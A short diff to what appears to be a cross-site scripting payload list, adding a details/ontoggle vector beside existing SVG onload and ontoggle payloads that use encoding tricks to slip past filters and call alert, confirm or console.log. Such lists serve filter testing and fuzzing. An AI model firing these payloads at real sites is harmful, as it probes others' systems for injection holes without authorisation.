@@ -1,3 +1,4 @@
+<details/open/ontoggle=write(1)//
 <details/open/ontoggle=console.log(7*7)//
 <Svg%20One%20OnLoad=alert\(1\)\>
 '"<Svg%20One%20OnLoad=confirm\(1\)\>
